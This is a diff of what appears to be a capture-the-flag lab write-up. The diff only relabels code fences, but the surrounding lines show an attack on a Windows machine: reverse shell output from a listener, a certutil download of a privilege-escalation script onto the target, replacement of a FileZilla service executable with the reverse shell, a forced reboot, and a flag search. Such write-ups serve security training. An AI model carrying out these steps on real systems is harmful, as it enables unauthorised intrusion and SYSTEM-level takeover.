@@ -334,7 +334,7 @@ Execute the reverse shell executable:
 ```
 
 Verify that the reverse shell has hooked on from the listener console
-```console
+```cmd
 connect to [192.168.17.10] from (UNKNOWN) [10.0.88.45] 49756
 Microsoft Windows [Version 10.0.14393]
 (c) 2016 Microsoft Corporation. All rights reserved.
@@ -350,7 +350,7 @@ Excellent, now we have shell on the target
 
 Scan for possible points of privilege escalation using [PrivescCheck](https://github.com/itm4n/PrivescCheck)
 
-```console
+```cmd
 c:\windows\system32\inetsrv>certutil.exe -urlcache -f -split https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1 C:\Users\myumbraco.local\PrivescCheck.ps1
 certutil.exe -urlcache -f -split https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1 C:\Users\myumbraco.local\PrivescCheck.ps1
 ****  Online  ****
@@ -442,7 +442,7 @@ UserCanStop       : False
 
 Replace the application binaries with the reverse shell executable we generated previously:
 
-```console
+```cmd
 c:\windows\system32\inetsrv>move C:\xampp\filezillaftp\filezillaserver.exe C:\xampp\filezillaftp\filezillaserver.exe.bak
 move C:\xampp\filezillaftp\filezillaserver.exe C:\xampp\filezillaftp\filezillaserver.exe.bak
         1 file(s) moved.
@@ -459,7 +459,7 @@ Reboot the target machine, and quickly re-open the netcat listener
 
 If done correctly, you should see:
 
-```console
+```cmd
 c:\windows\system32\inetsrv>shutdown -r -t 0
 shutdown -r -t 0
 
@@ -481,7 +481,7 @@ Perfect, we now have a SYSTEM-level shell
 
 Now all that's left is to search and retrieve the flag:
 
-```console
+```cmd
 C:\Windows\System32>dir C:\*flag* /s
 dir C:\*flag* /s
 ⋮
